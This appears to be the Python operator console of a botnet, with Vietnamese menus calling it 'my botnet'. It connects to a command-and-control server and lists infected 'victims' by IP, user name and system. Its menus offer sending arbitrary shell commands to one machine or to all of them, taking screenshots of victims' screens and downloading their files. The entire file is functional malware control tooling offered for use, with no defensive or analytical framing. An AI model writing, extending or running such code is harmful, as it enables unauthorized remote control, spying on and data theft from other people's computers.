import socketio
import requests
import os
from colorama import init, Fore, Style
import time
io = socketio.Client()

defcault_url = "http://localhost:5678/"
io.connect(defcault_url)


url_list = {
    "get_victims" : "api/user",
    "get_data" : "command/data",
}
vt_online = []
def log( message ,info="info"):
    if info == "success":
        print(f"{Fore.GREEN+Style.BRIGHT}[*] {message}")
    elif info == "warning":
        print(f"{Fore.YELLOW+Style.BRIGHT}[!] {message}")
    elif info == "error":
        print(f"{Fore.RED+Style.BRIGHT}[x] {message}")
    elif info == "info":
        print(f"{Fore.BLUE+Style.BRIGHT}[*] {message}")

def get_victims():
    try:
        os.system("cls")
        vt_online.clear()
        victims = requests.get(f"{defcault_url}{url_list['get_victims']}")
        data_victims = victims.json()["victims"]
        print(f"{Fore.GREEN+Style.BRIGHT}====================== ALL VICTIMS ======================")
        for i in range(0, len(data_victims)):
            print(f"""{Fore.YELLOW+Style.BRIGHT}---------------------- victims | {i + 1} -------------------------
{Fore.CYAN+Style.BRIGHT}ip :        {Fore.RESET+Style.BRIGHT}{data_victims[i]['ip_address']}
{Fore.CYAN+Style.BRIGHT}user_name : {Fore.RESET+Style.BRIGHT}{data_victims[i]['user_name']}
{Fore.CYAN+Style.BRIGHT}_id :       {Fore.RESET+Style.BRIGHT}{data_victims[i]['_id']}
{Fore.CYAN+Style.BRIGHT}system :    {Fore.RESET+Style.BRIGHT}{data_victims[i]['system']}
{Fore.CYAN+Style.BRIGHT}session :   {Fore.RESET+Style.BRIGHT}{data_victims[i]['session']}
{Fore.CYAN+Style.BRIGHT}release :   {Fore.RESET+Style.BRIGHT}{data_victims[i]['release']}
{Fore.CYAN+Style.BRIGHT}online :    {Fore.RESET+Style.BRIGHT}{data_victims[i]['online']}""")
            try:
                print(f"{Fore.CYAN+Style.BRIGHT}ip_socket : {Fore.GREEN+Style.BRIGHT}{data_victims[i]['ip_socket']}")
            except:
                print(f"{Fore.CYAN+Style.BRIGHT}ip_socket : {Fore.RED+Style.BRIGHT}null")
            print(f"{Fore.CYAN+Style.BRIGHT}online :    {Fore.GREEN+Style.BRIGHT}{data_victims[i]['online']}")
            if data_victims[i]['online'] == True:
                vt_online.append(data_victims[i])
        print(f"{Fore.GREEN+Style.BRIGHT}====================== ALL VICTIMS ======================")
        return None
    except:
        return None

def show_victims_online():
    try:
        if len(vt_online) > 0:
            for i in range(0 , len(vt_online)):
                try:
                    log(f"[{i}] ip_socket : {vt_online[i]['ip_socket']} | user_name : {vt_online[i]['user_name']} | online : {vt_online[i]['online']}", "success")
                except:
                    log(f"[{i}] ip_socket : null | user_name : {vt_online[i]['user_name']} | online : {vt_online[i]['online']}", 'success')
    except Exception as e:
        log(e, "error")
        return None

def recv_data_only(data):
    try:
        response = requests.get(f"{defcault_url}data/only/")
        if response.status_code == 200:
            if data == "dir":
                with open("dir.txt", "w") as f:
                    f.write(str(response.json()['data'][0]['dir']))
                    log("lấy dir thành công xem file dir.txt", "success")
                f.close()
            else:
                log(response.json()['data'], "success")
        else:
            log("lấy dữ liệu only thất bại", "error")
    except Exception as e:
        log(e, "error")

def recv_data_all():
    try:
        response = requests.get(f"{defcault_url}{url_list['get_data']}")
        if response.status_code == 200:
            log(response.json()['data'], "success")
        else:
            log("lấy dữ liệu only thất bại", "error")
        return None
    except Exception as e:
        log(e, "error")
        return None


def send_only():
    try:
        if len(vt_online) > 0:
            os.system("cls")
            how_to_use_target_only()
            show_victims_online()
            while True:
                try:
                    your_victim = int(input(f"{Fore.MAGENTA+Style.BRIGHT}[?] nạn nhân số mấy : "))
                    if type(your_victim) is int and your_victim < len(vt_online):
                        while True:
                            cmd = input(f"{Fore.MAGENTA+Style.BRIGHT}[+] cmd_to_only : ")
                            if cmd == "exit":
                                break
                            else:
                                data = {
                                    "id" : vt_online[your_victim]['ip_socket'],
                                    "cmd" : cmd
                                }
                                io.emit("send_to_only", data)
                                time.sleep(3)
                                recv_data_only(cmd)
                                
                    elif your_victim == 3005:
                        log("thoat chon", "info")
                        break
                    else:
                        log("lựa chọn nạn nhân không hợp lệ chonj 3005 để thoát", "warning")
                except Exception as e:
                    pass
        else:
            log("không có victims nào online. đợi đi", "warning")
            return None
    except:
        pass


def send_all():
    try:
        if len(vt_online) > 0:
            os.system("cls")
            notification_all_cmd()
            show_victims_online()
            while True:
                cmd = input(f"{Fore.MAGENTA+Style.BRIGHT}[+] cmd_to_all : ")
                if cmd == "exit":
                    break
                else:
                    io.emit("command", cmd)
                    time.sleep(3)
                    recv_data_all()
        else:
            log("không có victims nào online. đợi đi", "warning")
            return None
    except Exception as e:
        log(e, "error")
        pass


def menu_options():
    log("""
============== MENU ==============

1. get list victim
2. target only victim
3. target all victim
4. get victims online

    CẢM ƠN ĐÃ SỬ DỤNG BOTNET CỦA TÔI

============== MENU ==============""", "info")

def how_to_use_target_only():
    log("""
============== HOW TO USE ==============

1.  nhìn xem bao nhiêu victim đang hoạt động
2.  nhìn số thứ tự victims
3.  chọn mục tiêu bằng số thứ tự
4.  screen short ( chụp màn hình nạn nhân )
5.  download file [ name_file ] nếu đã ở ổ chứa file
6.  download file [ path_file ] nếu chưa ở ổ chứa file
7.  cd di chuyển thư mục
8.  dir để xem đang ở thư mục nòa ( dữ liệu về file dir.txt )
9.  và nhiều cmd khác
10. nếu bạn không muốn sử dụng nữa chọn 3005 để thoát
11. nếu bạn đã chọn target nhấn exit để thoát lựa chọn

    CẢM ƠN ĐÃ SỬ DỤNG BOTNET CỦA TÔI

=========================================

    <== TẤN CÔNG CHẾ ĐỘ 1 NẠN NHÂN ==>

""", "warning")

def notification_all_cmd():
    log("""
================== MENU ==================

1. screen short
2. download file [file_name] or [path_file]
3. exit để thoát

    lưu ý : dùng lệnh không dùng số

    CẢM ƠN ĐÃ SỬ DỤNG BOTNET CỦA TÔI

==========================================

  <== TẤN CÔNG CHẾ ĐỘ NHIỀU NẠN NHÂN ==>
""", "warning")
get_victims()
while True:
    menu_options()
    options = input(f"{Fore.MAGENTA+Style.BRIGHT}[?] options : ")
    if options == "1":
        get_victims()
    elif options == "2":
        send_only()    
    elif options == "3":
        send_all()
    elif options == "4":
        show_victims_online()
    else:
        os.system("cls")
        log("option không hợp lệ chọn lại", "error")
    

io.wait()
